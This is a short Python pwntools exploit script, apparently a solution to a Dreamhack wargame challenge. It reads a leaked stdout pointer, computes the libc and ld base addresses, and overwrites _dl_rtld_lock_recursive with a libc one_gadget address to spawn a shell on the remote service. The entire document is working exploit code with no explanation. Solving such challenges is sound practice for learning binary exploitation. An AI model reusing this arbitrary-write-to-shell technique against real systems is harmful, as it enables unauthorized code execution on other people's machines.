from pwn import *

#p = remote('127.0.0.1', 7182)
p = remote("host3.dreamhack.games", 14279)
libc = ELF('./libc-2.23.so')
ld = ELF('./ld-2.23.so')

one_gadgets = [0x45226, 0x4527a, 0xf03a4, 0xf1247]

p.recvuntil(b'stdout: ')
stdout = int(p.recvline()[:-1],16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']

ld_base = libc_base + 0x3ca000
dl_rtld_lock_recursive = ld_base + 0x226040 + 3848


p.sendlineafter(b"addr: ", str(dl_rtld_lock_recursive).encode())
p.sendlineafter(b"value: ", str(libc_base+one_gadgets[3]).encode()) 
p.interactive()

